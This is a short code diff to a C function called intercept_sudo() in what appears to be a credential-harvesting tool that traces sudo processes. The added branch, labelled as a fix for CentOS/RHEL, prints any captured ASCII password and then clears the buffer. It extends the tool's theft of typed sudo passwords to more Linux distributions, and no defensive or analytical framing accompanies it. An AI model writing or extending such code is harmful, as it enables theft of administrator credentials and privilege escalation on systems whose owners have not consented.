@@ -82,6 +82,11 @@ void intercept_sudo(pid_t traced_process) {
         free(read_string);
         read_string = NULL;
       }
+    } else if (i) { // needed for CentOS/RHEL
+      if (strnascii(password, i))
+        output("%s\n", password);
+      memset(password, 0, MAX_PASSWORD_LEN);
+      i = 0;
     }
 
     if (wait_for_syscall(traced_process) != 0)
